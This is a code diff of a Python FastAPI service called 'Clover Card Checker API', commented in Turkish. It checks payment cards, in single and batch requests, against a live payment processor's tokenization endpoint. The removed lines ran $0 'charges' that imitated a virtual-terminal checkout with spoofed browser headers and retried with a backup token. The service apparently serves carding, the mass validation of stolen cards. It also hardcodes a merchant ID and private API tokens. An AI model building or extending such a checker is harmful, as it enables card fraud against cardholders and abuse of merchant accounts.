@@ -1,6 +1,6 @@
 """
 CLOVER CARD CHECKER API - FASTAPI VERSION
-0$ CHARGE ile kart doğrulama
+SADECE TOKEN OLUŞTURUR, CHARGE YAPMAZ
 Swagger Docs: /docs
 ReDoc: /redoc
 """
@@ -63,12 +63,11 @@ class BatchCardRequest(BaseModel):
 class ParseRequest(BaseModel):
     data: Union[str, List, Dict] = Field(...)
 
-# ==================== KONFIGÜRASYON (YENİ TOKEN'LAR) ====================
+# ==================== KONFIGÜRASYON ====================
 CONFIG = {
     'merchant_id': '518993421163932',
-    'public_token': 'ede19e1b042d053ddfea06f8f206fb22',  # YENİ
-    'private_token': 'cc43c8d1-7813-fad4-4d3a-7bd733ba1fd6',  # YENİ - charge yetkili
-    'api_token': '1271ec57-b9a5-481d-9ac4-60d8cfa02e0e',  # Yedek
+    'public_token': 'ede19e1b042d053ddfea06f8f206fb22',
+    'private_token': 'cc43c8d1-7813-fad4-4d3a-7bd733ba1fd6',
     'api_base': 'https://api.clover.com',
     'token_api': 'https://token.clover.com',
     'charge_endpoint': 'https://www.clover.com/scl/v1/merchant/YHQFFZ1ZDDT61/charge',
@@ -81,7 +80,7 @@ CONFIG = {
 
 app = FastAPI(
     title="Clover Card Checker API",
-    description="Clover 0$ Charge ile Kart Doğrulama API'si",
+    description="Clover Token Oluşturma API'si (Charge yok)",
     version="7.0.0",
     docs_url="/docs",
     redoc_url="/redoc"
@@ -395,13 +394,9 @@ class CloverProcessor:
     def __init__(self):
         self.merchant_id = CONFIG['merchant_id']
         self.public_token = CONFIG['public_token']
-        self.private_token = CONFIG['private_token']
-        self.api_token = CONFIG['api_token']
         self.token_api = CONFIG['token_api']
-        self.charge_endpoint = CONFIG['charge_endpoint']
-        self.company_id = CONFIG['company_id']
     
-    def create_token(self, card: CardData) -> Tuple[bool, Optional[str], Optional[str]]:
+    def create_token(self, card: CardData) -> Tuple[bool, Optional[str], Optional[str], Optional[Dict]]:
         try:
             token_url = f"{self.token_api}/v1/tokens"
             
@@ -416,7 +411,7 @@ class CloverProcessor:
                     "exp_year": card.exp_year,
                     "cvv": card.cvc,
                     "brand": brand,
-                    "address_zip": "00000"
+                    "address_zip": "00000"  # Default zip
                 },
                 "multipay": False
             }
@@ -435,7 +430,7 @@ class CloverProcessor:
             if response.status_code == 200:
                 result = response.json()
                 logger.info(f'✅ Token başarılı: {result.get("id")}')
-                return True, result.get('id'), None
+                return True, result.get('id'), None, result
             else:
                 error_text = response.text
                 try:
@@ -444,92 +439,10 @@ class CloverProcessor:
                 except:
                     pass
                 logger.error(f'❌ Token hatası: {error_text}')
-                return False, None, error_text
+                return False, None, error_text, response.json()
                 
         except Exception as e:
             logger.error(f'❌ Token exception: {str(e)}')
-            return False, None, str(e)
-    
-    def charge_zero_dollar(self, token: str, card: CardData, bin_info: Dict = None) -> Tuple[bool, Optional[str], Optional[str], Optional[Dict]]:
-        try:
-            charge_url = f"{self.charge_endpoint}?companyId={self.company_id}&companyType=merchant"
-            
-            payload = {
-                'amount': 0,
-                'capture': True,
-                'tax_rate_uuid': 'FY6ZPX2PMQZM8',
-                'description': '',
-                'currency': 'USD',
-                'metadata': {
-                    'vt_payment_type': 'vt_checkout',
-                    'source_app': 'com.clover.virtualterminal',
-                    'existingDebtIndicator': 'false'
-                },
-                'ecomind': 'moto',
-                'source': token,
-                'custom_attributes': {}
-            }
-            
-            # Önce private token ile dene
-            headers = {
-                'Authorization': f'Bearer {self.private_token}',
-                'Content-Type': 'application/json',
-                'Accept': 'application/json, text/plain, */*',
-                'Origin': 'https://www.clover.com',
-                'Referer': 'https://www.clover.com/',
-                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
-            }
-            
-            logger.info(f'🔄 0$ Charge işlemi başlatılıyor...')
-            logger.info(f'📇 Kart: {card.get_masked()}')
-            logger.info(f'🔑 Token: {token}')
-            logger.info(f'🔐 Private Token: {self.private_token[:10]}...')
-            logger.info(f'📤 Payload: {json.dumps(payload)}')
-            
-            response = requests.post(charge_url, json=payload, headers=headers)
-            
-            logger.info(f'📊 Response Status: {response.status_code}')
-            
-            if response.status_code == 200:
-                result = response.json()
-                logger.info(f'✅ 0$ Charge başarılı!')
-                logger.info(f'📋 Charge ID: {result.get("id")}')
-                return True, result.get('id'), None, result
-            elif response.status_code == 401 and self.api_token:
-                # Private token çalışmadı, api_token ile dene
-                logger.warning(f'⚠️ Private token 401 verdi, API token deneniyor...')
-                headers['Authorization'] = f'Bearer {self.api_token}'
-                response = requests.post(charge_url, json=payload, headers=headers)
-                logger.info(f'📊 API Token Response Status: {response.status_code}')
-                
-                if response.status_code == 200:
-                    result = response.json()
-                    logger.info(f'✅ API Token ile 0$ Charge başarılı!')
-                    logger.info(f'📋 Charge ID: {result.get("id")}')
-                    return True, result.get('id'), None, result
-                else:
-                    error_text = response.text
-                    try:
-                        error_json = response.json()
-                        error_text = error_json.get('message', error_text)
-                    except:
-                        pass
-                    error_msg = f"HTTP {response.status_code}: {error_text}"
-                    logger.error(f'❌ API Token Charge hatası: {error_msg}')
-                    return False, None, error_msg, response.json()
-            else:
-                error_text = response.text
-                try:
-                    error_json = response.json()
-                    error_text = error_json.get('message', error_text)
-                except:
-                    pass
-                error_msg = f"HTTP {response.status_code}: {error_text}"
-                logger.error(f'❌ Charge hatası: {error_msg}')
-                return False, None, error_msg, response.json()
-                
-        except Exception as e:
-            logger.error(f'❌ Charge exception: {str(e)}')
             return False, None, str(e), None
     
     def process_card(self, card: CardData) -> Dict:
@@ -555,9 +468,9 @@ class CloverProcessor:
                     'CountryName': ''
                 }
             
-            # 2. Token Oluştur
-            logger.info('🔄 Adım 1/2: Token oluşturuluyor...')
-            success, token, error = self.create_token(card)
+            # 2. Token Oluştur (Sadece token, charge yok)
+            logger.info('🔄 Token oluşturuluyor...')
+            success, token, error, raw_response = self.create_token(card)
             
             if not success:
                 logger.error(f'❌ Token oluşturulamadı: {error}')
@@ -568,32 +481,13 @@ class CloverProcessor:
                     'error': error,
                     'bin_info': bin_info,
                     'check_id': check_id,
-                    'token': None
+                    'token': None,
+                    'raw_response': raw_response
                 }
             
             logger.info(f'✅ Token oluşturuldu: {token}')
             
-            # 3. 0$ Charge
-            logger.info('🔄 Adım 2/2: 0$ Charge işlemi yapılıyor...')
-            success, charge_id, error, raw_response = self.charge_zero_dollar(token, card, bin_info)
-            
-            if not success:
-                logger.error(f'❌ 0$ Charge başarısız: {error}')
-                return {
-                    'success': False,
-                    'status': 'CHARGE_FAILED',
-                    'message': '0$ Charge başarısız',
-                    'error': error,
-                    'token': token,
-                    'bin_info': bin_info,
-                    'check_id': check_id,
-                    'charge_id': None,
-                    'raw_response': raw_response
-                }
-            
-            logger.info(f'✅ 0$ Charge başarılı! Charge ID: {charge_id}')
-            
-            # 4. MongoDB'ye kaydet
+            # 3. MongoDB'ye kaydet (charge yok)
             if mongo_db:
                 record = {
                     'check_id': check_id,
@@ -609,26 +503,23 @@ class CloverProcessor:
                     'card_country_name': bin_info.get('CountryName'),
                     'bin_prefix': bin_info.get('BIN'),
                     'token': token,
-                    'charge_id': charge_id,
+                    'charge_id': None,
                     'amount': 0,
                     'currency': 'USD',
-                    'status': 'CAPTURED',
-                    'response_message': 'Kart başarıyla doğrulandı (0$ charge)',
-                    'is_zero_dollar': True,
+                    'status': 'TOKEN_CREATED',
+                    'response_message': 'Token başarıyla oluşturuldu (charge yapılmadı)',
+                    'is_zero_dollar': False,
                     'raw_response': json.dumps(raw_response) if raw_response else None
                 }
                 mongo_db.insert_record(record)
             
             return {
                 'success': True,
-                'status': 'CAPTURED',
-                'message': 'Kart başarıyla doğrulandı (0$ charge)',
+                'status': 'TOKEN_CREATED',
+                'message': 'Token başarıyla oluşturuldu (charge yapılmadı)',
                 'token': token,
-                'charge_id': charge_id,
                 'bin_info': bin_info,
                 'check_id': check_id,
-                'amount': 0,
-                'currency': 'USD',
                 'card_masked': card.get_masked(),
                 'card_brand': bin_info.get('Brand'),
                 'card_last4': card.number[-4:]
@@ -650,7 +541,7 @@ class CloverProcessor:
 @app.get("/", tags=["Root"])
 async def root():
     return {
-        "message": "Clover Card Checker API",
+        "message": "Clover Card Checker API (Token Only)",
         "docs": "/docs",
         "redoc": "/redoc",
         "health": "/health",
@@ -664,17 +555,16 @@ async def health_check():
     return {
         "status": "healthy",
         "timestamp": datetime.now().isoformat(),
-        "service": "Clover Card Check API (0$ Charge)",
+        "service": "Clover Card Check API (Token Only)",
         "version": "7.0.0",
         "environment": "LIVE",
         "mongodb": mongo_status,
         "clover": {
-            "merchant_id": CONFIG['merchant_id'][:4] + '***',
-            "charge_endpoint": CONFIG['charge_endpoint']
+            "merchant_id": CONFIG['merchant_id'][:4] + '***'
         },
         "endpoints": [
-            "POST /api/v1/check - Kart kontrolü (0$ charge)",
-            "POST /api/v1/check/batch - Toplu kart kontrolü",
+            "POST /api/v1/check - Token oluştur (charge yok)",
+            "POST /api/v1/check/batch - Toplu token oluştur",
             "POST /api/v1/parse - Sadece parse test",
             "GET /api/v1/bin/{card} - BIN kontrolü",
             "GET /api/v1/check/{id} - Kayıt sorgula",
@@ -860,16 +750,15 @@ if __name__ == '__main__':
     debug = os.getenv('DEBUG', 'False').lower() == 'true'
     
     print('=' * 60)
-    print('🏦 Clover Card Checker API (FastAPI)')
+    print('🏦 Clover Card Checker API (Token Only)')
     print('=' * 60)
     print(f'📍 Sunucu: http://localhost:{port}')
     print(f'📚 Swagger Docs: http://localhost:{port}/docs')
     print(f'📖 ReDoc: http://localhost:{port}/redoc')
     print(f'🔧 Debug: {debug}')
     print(f'🌍 Environment: LIVE')
-    print(f'💰 Charge Miktarı: 0$ (Doğrulama)')
+    print(f'💳 Sadece Token Oluşturulur, Charge Yapılmaz')
     print(f'🔐 Public Token: {CONFIG["public_token"][:10]}...')
-    print(f'🔐 Private Token: {CONFIG["private_token"][:10]}...')
     print('=' * 60)
     
     uvicorn.run(
